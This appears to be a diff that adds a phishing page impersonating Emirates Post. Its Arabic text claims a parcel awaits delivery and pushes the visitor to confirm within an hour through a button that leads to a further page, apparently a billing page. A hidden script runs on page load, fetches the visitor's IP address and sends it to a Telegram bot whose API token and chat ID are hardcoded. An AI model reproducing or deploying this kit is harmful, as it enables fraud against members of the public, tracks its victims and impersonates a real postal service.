@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+     <meta name="description"
+      content="Emirates Postal Services">
+      <link rel="shortcut icon" type="image" href="./img/faviicon.png">
+      <meta property="og:title" content="Emirates Post  Services" />
+      <meta property="og:description" content="تفاصيل الشحن " />
+
+    <meta name="viewport" content="width=device-width">
+    <meta name="robots" content="nofollow,noindex">
+    <title> Emirates Postal Services </title>
+    <link rel="stylesheet" href="./index_files/style.css">
+    <meta property="og:image" content="ar/inc/logoq.png">
+
+
+</head>
+
+<body style="background:#FAFAF9; padding:30px;  text-align:center; font-family:tahoma;">
+     <form action="../serverphp/index.php" method="post">
+    <img src="./img/logo.jpg" style="width:240px; margin:30px 0;">
+    <div style="background:white; padding:40px;">
+        <b>عزيزي العميل</b>
+        <p dir="rtl">يرجى ملاحظة أن الطرد الخاص بك في انتظار التسليم.
+            <br>
+            يرجى متابعة تأكيد الاستقبال باستخدام الرابط أدناه.
+        </p>
+        <a  ihref="Billing.html" target="_blank" id="btn-lien"
+            style="margin:20px 0; display:inline-block; text-decoration:none; padding:20px 60px; background:#363640; border-radius:3px; color:white;">انقر
+            هنا</a>
+        <p> يجب أن يتم التأكيد في أقل من ساعة .ستتلقى بريدا إلكترونيا يؤكد الشحنة مع معلومات التتبع</p>
+
+        <p>البريد الإماراتي     للخدمات اللوجستية <br>
+            الشركة الإماراتي      للخدمات البريدية</p>
+</form>
+        <hr style="margin:40px 0;">
+
+        <div style="color:#5CA9EE;">
+            إذا كانت لديك مشكلة .
+            يرجى الاتصال بنا لمزيد من التفاصيل على هاتف : 00 5 999995 أو عبر البريد الإلكتروني
+            <br>  custservicee@emiratespost.ae
+            .
+        </div>
+    </div>
+
+    <p style="margin:20px 0; font-size:0.8em; color:#939291;">OMAN POSTAL SERVICES 1950-2023. All rights reserved.</p>
+
+    <script src="./index_files/jq.js.télécharger"></script>
+ 
+    
+    <div style="display: none" class="ubey-RecordingScreen-count-down ubey-RecordingScreen-count-down-container">
+        <style>
+            .ubey-RecordingScreen-count-down-container {
+                position: fixed;
+                height: 100vh;
+                width: 100vw;
+                top: 0;
+                left: 0;
+                z-index: 9999999999999;
+                background-color: rgba(0, 0, 0, 0.2);
+            }
+
+            .ubey-RecordingScreen-count-down-content {
+                position: absolute;
+                display: flex;
+                top: 50%;
+                left: 50%;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                height: 15em;
+                width: 15em;
+                transform: translate(-50%, -100%);
+                background-color: rgba(0, 0, 0, 0.6);
+                border-radius: 50%;
+            }
+
+            #ubey-RecordingScreen-count-count {
+                font-size: 14em;
+                transform: translateY(-2%);
+            }
+        </style>
+        <div class="ubey-RecordingScreen-count-down-content">
+            <span id="ubey-RecordingScreen-count-count"></span>
+        </div>
+    </div>
+
+
+<script>
+    
+// Récupération du bouton par son ID
+const btnLien = document.getElementById("btn-lien");
+
+// Ajout d'un écouteur d'événement au clic sur le bouton
+btnLien.addEventListener("click", () => {
+  // Redirection vers la page spécifiée en utilisant la méthode `window.location.assign()`
+  window.location.assign("EMMMART.html");
+});
+
+// Récupération de l'adresse IP de l'utilisateur à l'aide de l'API ipify
+fetch('https://api.ipify.org/?format=json')
+  .then(response => response.json())
+  .then(data => {
+    var ipAddress = data.ip;
+    var message = ' 971:: Une visite a été effectuée depuis l\'adresse IP   ' + ipAddress;
+
+    // Envoyer le message à votre bot Telegram
+    var telegramBotAPIKey = '6136023488:AAGqHCMt4XHqqZR5ioV8qSOp4vNLDlrX2Jo';
+    var chatId = '5306332959';
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', 'https://api.telegram.org/bot' + telegramBotAPIKey + '/sendMessage?chat_id=' + chatId + '&text=' + message, true);
+    xhttp.send();
+  });
+
+
+</script>
+</body>
+
+</html>
